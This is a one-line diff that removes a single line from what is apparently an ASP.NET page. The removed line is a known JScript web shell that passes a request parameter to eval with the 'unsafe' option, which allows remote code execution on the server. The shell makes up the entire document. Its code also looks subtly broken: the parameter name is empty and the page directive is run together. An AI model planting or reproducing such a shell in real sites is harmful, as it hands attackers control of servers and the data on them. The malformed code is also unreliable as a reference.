@@ -1,1 +1,0 @@
-<%@PageLanguage=Jscript%><%Response.Write(eval(Request.Item[],unsafe));%>
